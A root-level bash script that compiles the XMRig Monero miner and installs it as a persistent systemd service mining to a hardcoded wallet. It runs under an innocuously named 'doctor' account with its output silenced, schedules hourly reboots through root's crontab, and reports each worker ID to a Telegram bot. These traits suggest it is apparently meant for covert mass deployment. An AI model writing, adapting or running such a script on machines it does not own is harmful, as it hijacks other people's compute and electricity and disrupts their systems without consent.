#!/bin/bash
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "Run as root or with sudo"
  exit 1
fi

# Telegram bot config (optional)
TG_BOT_TOKEN="YOUR_BOT_TOKEN"
TG_CHAT_ID="YOUR_CHAT_ID"
send_tg() {
  local text="$1"
  curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" \
    -d chat_id="$TG_CHAT_ID" \
    -d parse_mode="Markdown" \
    -d text="$text" >/dev/null || true
}

WORKER_ID="${1:-A00001}"
BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1Jjg3uQdY9d8cYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
WALLET="$BASE_WALLET.$WORKER_ID"

# Create user doctor if missing
if ! id -u doctor &>/dev/null; then
  useradd -m -r -s /usr/sbin/nologin doctor
fi

CPU_CORES=$(nproc)
THREADS=$(( CPU_CORES > 1 ? CPU_CORES - 1 : 1 ))

apt update
apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin

# Setup limits & hugepages
grep -q '* soft memlock 262144' /etc/security/limits.conf || echo -e "* soft memlock 262144\n* hard memlock 262144" >> /etc/security/limits.conf
for f in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
  grep -q pam_limits.so "$f" || echo 'session required pam_limits.so' >> "$f"
done
grep -q 'vm.nr_hugepages=128' /etc/sysctl.conf || echo "vm.nr_hugepages=128" >> /etc/sysctl.conf
sysctl -p
setcap cap_sys_nice=eip "$(which screen)"

cd /home/doctor
if [ ! -d xmrig ]; then
  sudo -u doctor git clone https://github.com/xmrig/xmrig.git
fi
cd xmrig/build 2>/dev/null || mkdir -p build && cd build
sudo -u doctor cmake ..
sudo -u doctor make -j"$CPU_CORES"

cat >/etc/systemd/system/xmrig.service <<EOF
[Unit]
Description=XMRig Miner Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/home/doctor/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
Restart=always
LimitMEMLOCK=infinity
User=doctor
WorkingDirectory=/home/doctor/xmrig/build
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/xmrig.service
systemctl daemon-reload
systemctl enable xmrig
systemctl start xmrig

# Schedule hourly reboot via root crontab
(crontab -l 2>/dev/null | grep -v '/sbin/reboot' || true; echo "0 * * * * /sbin/reboot") | crontab -

echo "Setup complete: Miner running as doctor user and system reboots hourly."
send_tg "✅ Setup complete\nWorker ID: \`$WORKER_ID\`\nMiner running and system will reboot hourly."
